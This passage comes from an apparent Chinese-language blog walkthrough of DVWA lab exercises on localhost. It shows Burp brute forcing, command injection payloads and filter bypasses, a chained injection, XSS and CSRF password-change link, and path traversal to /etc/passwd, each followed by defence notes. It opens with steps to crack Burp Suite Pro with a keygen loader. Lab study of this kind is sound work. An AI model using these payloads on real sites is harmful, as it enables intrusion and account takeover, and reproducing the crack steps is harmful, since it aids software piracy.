</span></span><span style=display:flex><span><span style=color:#75715e>#install JAVA JDK11</span>
</span></span><span style=display:flex><span> export JAVA_HOME<span style=color:#f92672>=</span>/opt/jdk-11.0.17
</span></span><span style=display:flex><span> export CLASSPATH<span style=color:#f92672>=</span>.:<span style=color:#e6db74>${</span>JAVA_HOME<span style=color:#e6db74>}</span>/lib
</span></span><span style=display:flex><span> export PATH<span style=color:#f92672>=</span><span style=color:#e6db74>${</span>JAVA_HOME<span style=color:#e6db74>}</span>/bin:$PATH
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>source /etc/profile
</span></span><span style=display:flex><span>source ~/.zshrc <span style=color:#75715e># 使环境生效</span>
</span></span><span style=display:flex><span>java -version <span style=color:#75715e># 验证是否成功</span>
</span></span></code></pre></div></li><li><p>破解bs</p><ol><li><p>将文件拷贝到<code>/usr/bin</code>目录中</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo cp -r BurpLoaderKeygen.jar burpsuite_pro_v2022.9.5.jar /usr/bin
</span></span></code></pre></div></li><li><p>激活</p><p>进入<code>/usr/bin</code></p><pre tabindex=0><code>cd /usr/bin
</code></pre><p>启动激活程序(jar程序启动通用命令)</p><pre tabindex=0><code>java -jar BurpLoaderKeygen.jar 
</code></pre><p>点击run</p><p>点击next</p><p>点击Manual activation完成手动激活</p></li><li><p>启动</p><p><code>java -javaagent:/usr/bin/BurpLoaderKeygen.jar -noverify -jar /usr/bin/burpsuite_pro_v2022.9.5.jar</code></p></li></ol></li><li><p>配置bs代理</p></li></ol><div id=密码爆破 class=anchor>密码爆破></div><h2 class="relative group">密码爆破
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#%e5%af%86%e7%a0%81%e7%88%86%e7%a0%b4 aria-label=锚点>#</a></span></h2><div id=low class=anchor>low></div><h3 class="relative group">low
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#low aria-label=锚点>#</a></span></h3><p>提交请求，使用bs抓包</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071438738.png alt=image-20221031141450425></figure></p><p>观察提交网址 <code>http://127.0.0.1/vulnerabilities/brute/?username=admin&amp;password=password&amp;Login=Login#</code></p><p>可知道在<code>/vulnerabilities/brute/</code>路径下找到包内容</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071438502.png alt=image-20221031141421215></figure></p><p>使用bs内置的工具 Intruder (入侵者)</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071438836.png alt=image-20221031141538396></figure></p><p>标记需要替换的内容，不需要替换的取消标记</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071438573.png alt=取消标记></figure></p><p>告诉bs以何种方式替换（攻击类型）以及替换成什么数据（字典）</p><p><figure><img class="my-0 rounded-md" src=DVWA.assets/image-20221031141901363.png alt=攻击类型></figure></p><ul><li><p>Sniper</p><p>替换一个参数</p></li><li><p>Battering ram</p><p>适合多个参数的值相同</p></li><li><p>Pitchfork</p><p>多个参数值不同</p></li><li><p>Cluster bomb</p><p>多个参数值不同，全排列</p></li></ul><p>给username添加尝试数据</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071438971.png alt=username></figure></p><p>给password添加尝试数据</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071438723.png alt=password></figure></p><p>开始攻击</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071438900.png alt=image-20221031142703285></figure></p><p>找出结果，一般情况下正确结果的返回报文长度更长</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071438069.png alt=image-20221031142912124></figure></p><div id=medium class=anchor>medium></div><h3 class="relative group">medium
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#medium aria-label=锚点>#</a></span></h3><p><strong>源码分析</strong></p><p>对比low和medium的源码</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071438432.png alt=源码对比></figure></p><p>因此，我们还是可以使用low级别的爆破方式来对密码进行爆破</p><p>攻击并找出结果</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071439621.png alt=image-20221031144421623></figure></p><div id=high class=anchor>high></div><h3 class="relative group">high
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#high aria-label=锚点>#</a></span></h3><p>尝试输入错误密码，观察网址</p><p><code>http://127.0.0.1/vulnerabilities/brute/?username=a&amp;password=a&amp;Login=Login&amp;user_token=eef7206a4c0369e0d16c776f9fed38b7#</code></p><p>会发现多出了一个参数<code>user_token</code></p><p>将该网址在新标签页中打开，会发现提示token不正确的提示，并且也没有提示密码是否错误</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071439156.png alt=image-20221031145732258></figure></p><p>那么，token哪来的？</p><p><strong>源码分析</strong></p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071439705.png alt=image-20221031150245459></figure></p><p>anti-csrf token 一种常见的web应用安全机制，类似验证码和带token的表单</p><blockquote><p>表单1提交的时候会生成token2，并将这个token2和表单2绑定，当表单2提交就会生成token3，与表单3绑定，以此类推</p></blockquote><p>因此，我们需要知道初始token，在submit之后自动采集新的token，并附带到下一次的submit。</p><p>那么如何得到初始token？如何采集新token？</p><p>设定为Pitchfork模式，因为每次token不同，不能使用Cluster bomb模式</p><p>选定username、password、user_token三个替换点</p><p>因为每次user_token需要从上次的回应中获取，因此数据列表不能继续使用Simple List类型，得换成Recursive grep</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071439803.png alt="Recursive grep"></figure></p><p>如何定位token？通过检查元素可以找到</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071439474.png alt=image-20221031153301664></figure></p><p>至此，获取了初始token，然后将其填入Payloads</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071439264.png alt=image-20221031153312417></figure></p><p>点击Options， 因为要顺序发送请求，所以要把线程数调到1</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071439782.png alt=image-20221031153356417></figure></p><p>接下来要获取新产生的token，将其放入下一次请求报文中</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071439251.png alt=image-20221101183105179></figure></p><p>开始攻击，查看结果</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071439246.png alt=image-20221101183239758></figure></p><div id=impossible class=anchor>impossible></div><h3 class="relative group">impossible
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#impossible aria-label=锚点>#</a></span></h3><p>分析源代码</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071439625.png alt=image-20221101191510576></figure></p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071439373.png alt=image-20221101191056785></figure></p><p>同一个账号可以尝试三次密码，超过三次会锁定15分钟</p><div id=总结与防御 class=anchor>总结与防御></div><h3 class="relative group">总结与防御
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#%e6%80%bb%e7%bb%93%e4%b8%8e%e9%98%b2%e5%be%a1 aria-label=锚点>#</a></span></h3><p>​ 由于服务器没有对用户的输入次数进行限制，导致攻击者可以利用爆破的手段来进行攻击，通过穷举法将用户名、密码等信息爆出来。当攻击者结合社会工程学生成了庞大的字典时，爆破攻击的可能性将会被增大。对于爆破漏洞，开发者可以对用户的登陆次数设置阈值，当某用户名表示的用户的登录次数在一定时间内超过阈值时，就暂时锁定用户。也可以进行 IP 检测，如果某个 IP 的登录次数超过阈值也可以锁定 IP。当然还有一种我们熟悉的方式，就是设置只有人可以通过验证的验证码或者是其他的验证手法，来保证进行登录操作的是人而不是机器。</p><div id=command-injection命令注入 class=anchor>command injection命令注入></div><h2 class="relative group">command injection命令注入
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#command-injection%e5%91%bd%e4%bb%a4%e6%b3%a8%e5%85%a5 aria-label=锚点>#</a></span></h2><div id=low-1 class=anchor>low></div><h3 class="relative group">low
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#low-1 aria-label=锚点>#</a></span></h3><p>猜测其直接调用系统命令，直接输入baidu.com&&amp;ls，可以看到ls命令也被运行了</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071439848.png alt=image-20221119202114988></figure></p><div id=medium-1 class=anchor>medium></div><h3 class="relative group">medium
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#medium-1 aria-label=锚点>#</a></span></h3><p>输入baidu.com&&amp;ls，没有结果</p><p><strong>分析源码</strong></p><p>可以看到他是做了简单的替换，把&&变成&或者|就可以了</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071439518.png alt=image-20221119202815724></figure></p><p>发起攻击</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071439302.png alt=image-20221119202935371></figure></p><div id=high-1 class=anchor>high></div><h3 class="relative group">high
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#high-1 aria-label=锚点>#</a></span></h3><p>查看源码，可以看到它只过滤了<code>|+空格</code> ，因此只写一个|也是可以绕过的</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071439186.png alt=image-20221121153257419></figure></p><p>发起攻击</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071439909.png alt=image-20221121153110036></figure></p><div id=impossible-1 class=anchor>impossible></div><h3 class="relative group">impossible
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#impossible-1 aria-label=锚点>#</a></span></h3><p>输入baidu.com都不行了</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071439042.png alt=image-20221121154043138></figure></p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071439247.png alt=image-20221121153848618></figure></p><p>将输入的信息以<code>.</code>分割成四份，分别判断是否是数字</p><div id=总结与防御-1 class=anchor>总结与防御></div><h3 class="relative group">总结与防御
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#%e6%80%bb%e7%bb%93%e4%b8%8e%e9%98%b2%e5%be%a1-1 aria-label=锚点>#</a></span></h3><p>​ 在一些 Web 程序中需要调用一些执行系统命令的函数，例如 PHP 的 system、exec、shell_exec 函数等。当攻击者能够直接操作命令执行的参数，并且没有代码对传入的参数进行过滤时，攻击者就能将用于搞破坏的系统命令夹带进来让系统执行。
在 Windows 系统和 Linux 系统中都有一些管道符，这些管道符可以被用来拼接攻击指令：</p><ul><li>“&&”：前面的语句正确执行时，才执行后面的语句；</li><li>“&”：前面的语句执行出错时，执行后面的语句；</li><li>“|”：将前面的语句运行的结果，当做后面语句的输入，显示后面语句的执行结果；</li><li>“||”：前面的语句出错时，执行后面的语句。</li></ul><p>​ 对于指令注入漏洞，比较好的防御方式是尽可能别用命令执行函数，对于输入的参数要做好黑名单过滤或者白名单验证。</p><div id=跨站请求伪造-csrf class=anchor>跨站请求伪造 CSRF></div><h2 class="relative group">跨站请求伪造 CSRF
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#%e8%b7%a8%e7%ab%99%e8%af%b7%e6%b1%82%e4%bc%aa%e9%80%a0-csrf aria-label=锚点>#</a></span></h2><blockquote><p><code>CSRF</code> 全称 <code>Cross Site Request Forgery，跨站点请求伪造</code>，攻击者通过跨站请求，以合法的用户身份进行非法操作，如转账交易、发表评论等。其核心是利用了浏览器 <code>Cookie</code> 或服务器的 <code>Session</code> 策略，盗取用户的身份信息</p></blockquote><div id=low-2 class=anchor>low></div><h3 class="relative group">low
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#low-2 aria-label=锚点>#</a></span></h3><p>抓包查看</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071439809.png alt=image-20221125130859800></figure></p><p>此时在另一个窗口打开这个链接，是可以打开该页面的。但是如果换一个浏览器就不可以</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071439216.png alt=image-20221125131025881></figure></p><p>因此该攻击的难点在于诱骗受害者点击具有转账或者修改功能的链接</p><div id=medium-2 class=anchor>medium></div><h3 class="relative group">medium
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#medium-2 aria-label=锚点>#</a></span></h3><p>查看源码</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071440398.png alt=image-20221125132857052></figure></p><p>因此我们需要从本站诱导用户点击带有<code>HTTP_REFERER</code> 的链接</p><p>这可以结合XSS来实现，先在本站下新建一个具有XSS漏洞的文件，这可以通过命令注入实现，以提供基础条件</p><p><code>127.0.0.1|echo "&lt;?php echo $_GET['x'];" > /var/www/html/vulnerabilities/csrf/xss.php</code></p><p>这个页面会显示接收的参数，但是如果在里面写入代码，就会被解析</p><p>例如<code>http://127.0.0.1/vulnerabilities/csrf/xss.php?x=%3Cimg%20src=%221%22%3E</code></p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071440889.png alt=image-20221125142110309></figure></p><p>![image-20221125142406766](D:\OneDrive - mail.ynu.edu.cn\note\typoranote\DVWA.assets\image-20221125142406766.png)</p><p>查看请求记录，可以看到src=1被请求了，并且相应的信息也都是携带的</p><p>那么，我们就可以将其变为修改密码的请求链接，即</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>http://127.0.0.1/vulnerabilities/csrf/xss.php?x=&lt;img src=&#34;http://127.0.0.1/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>还需要编码
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>http%3A%2F%2F127.0.0.1%2Fvulnerabilities%2Fcsrf%2F%3Fpassword_new%3Dpassword%26password_conf%3Dpassword%26Change%3DChange
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>即最终的链接为
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>http://127.0.0.1/vulnerabilities/csrf/xss.php?x=&lt;img src=&#34;http%3A%2F%2F127.0.0.1%2Fvulnerabilities%2Fcsrf%2F%3Fpassword_new%3Dpassword%26password_conf%3Dpassword%26Change%3DChange&#34;&gt;
</span></span></span></code></pre></div><p>发起请求</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071440757.png alt=image-20221125143022761></figure></p><p>可以看到修改密码的请求状态码为200，表示攻击成功</p><div id=high-2 class=anchor>high></div><h3 class="relative group">high
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#high-2 aria-label=锚点>#</a></span></h3><p>获取请求链接，发现多了一个参数<code>user_token</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>http://127.0.0.1/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change&amp;user_token=aab541b1f7939ab38e862c7f5c565a0e
</span></span></span></code></pre></div><p>同样需要xss注入，这次请求图片已经不够用了，需要请求.js文件，里面编写代码，获取token并发起修改密码请求</p><div id=impossible-2 class=anchor>impossible></div><h3 class="relative group">impossible
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#impossible-2 aria-label=锚点>#</a></span></h3><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071440251.png alt=image-20221125151452340></figure></p><p>我都知道当前密码了，为什么还用这个漏洞，因此这是impossible</p><div id=总结与防御-2 class=anchor>总结与防御></div><h3 class="relative group">总结与防御
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#%e6%80%bb%e7%bb%93%e4%b8%8e%e9%98%b2%e5%be%a1-2 aria-label=锚点>#</a></span></h3><p>​ CSRF 跨站请求伪造攻击是攻击者利用目标用户的身份，以目标用户的名义执行某些错误操作的攻击方式，会极大地威胁用户的权益。CSRF 攻击的 2 个重点是：</p><ol><li>目标用户登录了网站，并且能正常执行该网站的操作；</li><li>目标用户访问了攻击者制作的攻击页面。</li></ol><p>​ CSRF 漏洞的防御方式是验证请求的 Referer 字段值，如果该字段值是以自己的网站开头的域名，则说明该请求是来源于自己，就可以通过验证进行访问。当该字段值是其他网页的域名或者空白时，就说明这有可能是 CSRF 攻击，这时候就应该拒绝这个请求。
​ 不过这种方法能起到的作用有限，因为攻击者可以用其他方式绕过验证。还有一种更合适的方式是在请求中放入攻击者不能够伪造的信息，例如使用 Anti-CSRF token 机制，让访问者需要通过一个随机生成的 token 进行验证。还有可以通过一些密保问题，因为这些问题的答案理论上只有访问者自己知道，攻击者也无法伪造。</p><div id=文件包含-file-inclusion class=anchor>文件包含 File Inclusion></div><h2 class="relative group">文件包含 File Inclusion
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab-file-inclusion aria-label=锚点>#</a></span></h2><div id=low-3 class=anchor>low></div><h3 class="relative group">low
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#low-3 aria-label=锚点>#</a></span></h3><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071440191.png alt=image-20221125153715829></figure></p><p>并没有做其他的过滤，因此输入的只要是个文件路径都可以被查看，借此可以看到其他敏感文件</p><p>比如输入<code>http://127.0.0.1/vulnerabilities/fi/?page=../../../../../../../../../../../../etc/passwd</code></p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071440791.png alt=image-20221125154112533></figure></p><div id=medium-3 class=anchor>medium></div><h3 class="relative group">medium
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#medium-3 aria-label=锚点>#</a></span></h3><p>分析源码</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071440030.png alt=image-20221125155424285></figure></p><p>只是一个简单的过滤，<code>http://127.0.0.1/vulnerabilities/fi/?page=....//....//....//....//....//....//....//etc/passwd</code></p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071440215.png alt=image-20221125155608148></figure></p><p>可以看到，这样也是可以访问的</p><blockquote><p>除了查看文件，还可以远程下载文件，或者打开网页，下载文件的同时是可以执行文件的，如果文件中是一句话木马，那么终端控制权就会到手</p></blockquote><div id=high-3 class=anchor>high></div><h3 class="relative group">high
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#high-3 aria-label=锚点>#</a></span></h3><p>限制上传的文件名只能以file开头</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071440585.png alt=image-20221125163239419></figure></p><p>php有一个函数也是以file开头的，可以借此查看其他的文件</p><div id=impossible-3 class=anchor>impossible></div><h3 class="relative group">impossible
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#impossible-3 aria-label=锚点>#</a></span></h3><p>限制了只能输入四个允许文件名</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071440084.png alt=image-20221125163410559></figure></p><div id=总结与防御-3 class=anchor>总结与防御></div><h3 class="relative group">总结与防御
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#%e6%80%bb%e7%bb%93%e4%b8%8e%e9%98%b2%e5%be%a1-3 aria-label=锚点>#</a></span></h3><p>​ 为了更好地使用代码的重用性，可以使用文件包含函数将文件包含进来，直接使用文件中的代码来提高重用性。但是这也产生了<strong>文件包含漏洞</strong>，产生原因是在通过 PHP 的函数引入文件时，为了灵活包含文件会将被包含文件设置为变量，通过动态变量来引入需要包含的文件。此时用户可以对变量的值可控，而服务器端未对变量值进行合理地校验或者校验被绕过，就会导致文件包含漏洞。常用的文件包含函数有 include()、include_once()、require()、require_once()。
​ 包含漏洞分为本地包含和原创包含 2 类，当包含的文件在服务器本地时，就形成了本地文件包含。文件包含可以包含任意文件，被包含的文件可以不是 PHP 代码，可以是文本或图片等。只要文件被包含就会被服务器脚本语言执行，如果包含的文件内容不符合 php 语法，会直接将文件内容输出。例如下面这段简易的代码：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>Copy</span> <span style=color:#a6e22e>Highlighter</span><span style=color:#f92672>-</span><span style=color:#a6e22e>hljs</span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>    $file <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;file&#39;</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>include</span>($file);
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>当包含的文件在远程服务器上时，就形成了远程文件包含。所包含远程服务器的文件后缀不能与目标服务器语言相同，远程文件包含需要在 php.ini 中设置：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ini data-lang=ini><span style=display:flex><span><span style=color:#a6e22e>Copy Highlighter-hljsallow_url_include</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>on（是否允许 include/require 远程文件）</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>allow_url_fopen</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>on（是否允许打开远程文件）</span>
</span></span></code></pre></div><div id=文件上传-file-upload class=anchor>文件上传 File Upload></div><h2 class="relative group">文件上传 File Upload
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0-file-upload aria-label=锚点>#</a></span></h2><div id=low-4 class=anchor>low></div><h3 class="relative group">low
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#low-4 aria-label=锚点>#</a></span></h3><p>唯一的限制条件就是文件大小，还是在前端，用F12改一下就可以了</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071440885.png alt=image-20221125163642858></figure></p><div id=medium-4 class=anchor>medium></div><h3 class="relative group">medium
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#medium-4 aria-label=锚点>#</a></span></h3><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071440459.png alt=image-20221125163756171></figure></p><p>通过数据报获取信息，因此可以通过重放数据报来达到上传其他类型文件的目的</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071440939.png alt=image-20221125164226948></figure></p><p>可以看到可以通过校验的字段是<code>image/png</code> 或<code>image/jpeg</code></p><p>尝试上传其他类型文件</p><p>使用bs拦截并修改报文</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071440768.png alt=image-20221125165528090></figure></p><p>成功上传</p><p><figure><img class="my-0 rounded-md" 